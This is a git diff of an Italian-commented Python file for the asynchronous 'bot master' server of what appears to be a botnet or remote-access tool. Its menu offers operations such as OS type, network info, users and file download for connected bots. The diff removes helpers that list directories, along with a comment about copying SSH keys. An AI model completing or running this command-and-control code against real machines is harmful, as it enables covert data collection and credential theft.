@@ -1,8 +1,10 @@
 """Implementazione delle funzioni asincrone per la gestione del server (bot master)."""
 import asyncio  # Non è necessario importare anche socket (asyncio lo fa da solo)
 from aioconsole import ainput  # Async console per asyncio
-import os
 # import aiofiles
+
+# Librerie personali
+from . import bot_master_utility as bot_master_utils
 
 
 HOST = "127.0.0.1"
@@ -16,47 +18,6 @@ __response_options = {"1": "OS-TYPE",
                       "7": "NETWORK-INFO",
                       "8": "USERS",
                       "15": "DOWNLOAD-FILE"}
-"""
-TODO: Ampliare i values (sono quelli tra le parentesi []) con quelli specifici per MacOS (che dovrebbero essere in parte simili a quelli di Linux)
-TODO: Per la gestione di recupero dati da win: https://stackoverflow.com/questions/13184414/how-can-i-get-the-path-to-the-appdata-directory-in-python
-Struttura: key: [Linux, Win, MacOS]
-"""
-__filesystem_hierarchy = {"1": ["/", "C:/"],  # Da utilizzare in maniera non ricorsiva, ma per avere le info generali sulle directory possibili
-                          "2": [f"/home/{os.getlogin()}/", "C:/NON_SO_IL_PATH"],
-                          "3": [],  # SSH KEYS (Potrebbe risultare interessante copiare queste informazioni)
-                          "4": [],  # Recupero immagini (?)
-                          }
-
-
-def get_directory_list(parent_path: str):
-    """Recupero info del contenuto delle directory."""
-    for current_dir in os.listdir(parent_path):
-        # Controlliamo di avere i permessi necessari per leggere nella directory
-        if os.access(f"{parent_path}{current_dir}", os.R_OK) is True:
-            print(f"Contenuto di {parent_path}{current_dir}:")
-            content = os.listdir(f"{parent_path}{current_dir}")
-            print(content)
-        else:
-            print(f"Per mancanza di permessi non viene mostrato il contenuto di {parent_path}{current_dir}")
-
-
-# Da preferire in quanto non restituisce nulla nel caso in cui si stia cercando di leggere una directory senza permessi
-def get_path_content(current_position: str):
-    """Recupero info su directory e file."""
-    for path, dirs, files in os.walk(current_position):
-        for filename in files:
-            print(os.path.join(path, filename))
-
-
-def print_menu(dictionary: dict, title: str, width=int) -> None:
-    """Menu di scelta per l'operazione da effettuare."""
-    north_box = f'╔{"═" * width}╗'  # upper_border
-    south_box = f'╚{"═" * width}╝'  # lower_border
-    print(north_box)
-    print(f"║ {title}")
-    for item in dictionary.keys():
-        print("║\t", item, '--', dictionary[item])
-    print(south_box)
 
 
 async def handle_bot_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
@@ -70,7 +31,7 @@ async def handle_bot_client(reader: asyncio.StreamReader, writer: asyncio.Stream
             print(f"Il client {test_addr}:{test_port} ha effettuato una connessione di test per la verifica dello stato del server")
             break
         if response == b"Operazione?":  # Se la response è vuota eseguiamo un comando da inviare al client che si tradurrà in una operazione
-            print_menu(__response_options, "Operazioni disponibili:", 32)
+            bot_master_utils.print_menu(__response_options, "Operazioni disponibili:", 32)
             request = await ainput(">>> ")  # TODO: al momento non la usiamo -> Punto ad aggiungere una serie di funzioni/cases per la richiesta da effettuare al client
             if request in __response_options.keys():
                 print(f"Opzione scelta: {request}")
@@ -91,14 +52,10 @@ async def handle_bot_client(reader: asyncio.StreamReader, writer: asyncio.Stream
     await writer.wait_closed()  # Attendiamo che il client sia chiuso prima di stoppare
 
 
-async def run_server() -> None:
+async def run_server(hostname: str, port: int) -> None:
     """Esecuzione del loop di gestione della connessione con il client."""
     server = await asyncio.start_server(handle_bot_client, HOST, PORT)
 
     async with server:
         async with server:
             await server.serve_forever()
-
-if __name__ == "__main__":
-    loop = asyncio.new_event_loop()
-    loop.run_until_complete(run_server())
